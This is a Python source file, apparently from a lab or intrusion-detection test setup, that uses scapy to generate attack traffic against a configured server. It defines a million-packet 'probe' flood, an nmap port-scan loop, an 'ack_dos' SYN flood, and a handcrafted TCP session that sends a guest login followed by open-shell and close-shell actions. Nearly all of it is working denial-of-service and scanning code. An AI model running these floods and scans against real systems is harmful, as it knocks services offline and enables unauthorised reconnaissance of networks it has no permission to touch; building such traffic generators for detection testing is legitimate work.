from scapy.all import send, IP, TCP, Raw, sr1
import os
from settings import (
    IF_NAME,
    SERVER_IP,
    SERVER_PORT,
    ATTACK_SERVER_IP,
    ATTACK_SERVER_PORT,
)
import utils.payload_data as pd


__all__ = ["probe", "port_scan", "ack_dos"]


def __send_packet(
    destination_ip, source_port, destination_port, data, flags, timeout=10
):
    ip = IP(dst=destination_ip)
    tcp = TCP(sport=source_port, dport=destination_port, flags=flags)
    raw = Raw(load=data)
    packet = ip / tcp / raw
    sr1(packet, timeout=timeout)

    print(f"Sent {flags} packet to {destination_ip}:{destination_port}")


# Define the target IP and port
target_ip = SERVER_IP
target_port = SERVER_PORT


# Function to perform TCP three-way handshake
def tcp_handshake():
    # Step 1: Send SYN
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    syn_ack_packet = sr1(syn_packet)

    # Get the sequence and ack numbers
    seq = syn_ack_packet[TCP].ack
    ack = syn_ack_packet[TCP].seq + 1

    # Step 2: Send ACK
    ack_packet = IP(dst=target_ip) / TCP(dport=target_port, seq=seq, ack=ack, flags="A")
    send(ack_packet)

    return seq, ack


# Function to send payload
def send_payload(seq, ack, payload):
    # Send payload
    payload_packet = (
        IP(dst=target_ip)
        / TCP(dport=target_port, seq=seq, ack=ack, flags="PA")
        / payload
    )
    send(payload_packet)

    # Increment sequence number by payload length
    seq += len(payload)

    return seq


# Function to perform TCP connection teardown
def tcp_teardown(seq, ack):
    # Step 1: Send FIN
    fin_packet = IP(dst=target_ip) / TCP(
        dport=target_port, seq=seq, ack=ack, flags="FA"
    )
    fin_ack_packet = sr1(fin_packet)

    # Step 2: Wait for Server's FIN and Send ACK
    # fin_from_server = ... # Logic to receive server's FIN packet
    last_ack = IP(dst=target_ip) / TCP(
        dport=target_port,
        seq=fin_ack_packet[TCP].ack,
        ack=fin_ack_packet[TCP].seq + 1,
        flags="A",
    )
    send(last_ack)


def sim():
    seq, ack = tcp_handshake()
    payload = "Hello, this is a test message."
    seq = send_payload(
        seq,
        ack,
        pd.create_login_data(pd.LoginStatus.SUCCESS.value | pd.LoginStatus.GUEST.value),
    )
    seq = send_payload(seq, ack, pd.create_action_data(pd.Actions.OPEN_SHELL.value))
    seq = send_payload(seq, ack, pd.create_action_data(pd.Actions.CLOSE_SHELL.value))
    tcp_teardown(seq, ack)

    # s_data = "start sending packet"
    # a_data = "acknowledge"
    # data = "Hello, this is some fake data!"
    # f_data = "finish sending packet"
    # number_of_packet_to_send = 1

    # send_packet(destination_ip, source_port, destination_port, s_data, "S")
    # send_packet(destination_ip, source_port, destination_port, a_data, "A")
    # for _ in range(number_of_packet_to_send):
    #     send_packet(destination_ip, source_port, destination_port, data, "PA")
    # send_packet(destination_ip, source_port, destination_port, f_data, "F")


def probe():
    """A general probe attack"""
    destination_ip = SERVER_IP
    source_port = ATTACK_SERVER_PORT
    destination_port = SERVER_PORT
    s_data = "start sending packet"
    a_data = "acknowledge"
    data = "Hello, this is some fake data!"
    f_data = "finish sending packet"
    number_of_packet_to_send = 1000000

    __send_packet(destination_ip, source_port, destination_port, s_data, "S")
    __send_packet(destination_ip, source_port, destination_port, a_data, "A")
    for _ in range(number_of_packet_to_send):
        __send_packet(destination_ip, source_port, destination_port, data, "PA")
    __send_packet(destination_ip, source_port, destination_port, f_data, "F")


def port_scan():
    """Uses nmap to check if server ports are open (probe)"""
    max_port = 8100
    for i in range(7900, max_port):
        os.system(f"nmap -p {i} {SERVER_IP}")


def ack_dos():
    """Sends thousands of TCP acks to dos server (dos)"""
    destination_ip = SERVER_IP
    source_port = ATTACK_SERVER_PORT
    destination_port = SERVER_PORT
    s_data = "start sending packet"
    number_of_packet_to_send = 1000000

    for _ in range(number_of_packet_to_send):
        __send_packet(destination_ip, source_port, destination_port, s_data, "S", 1)
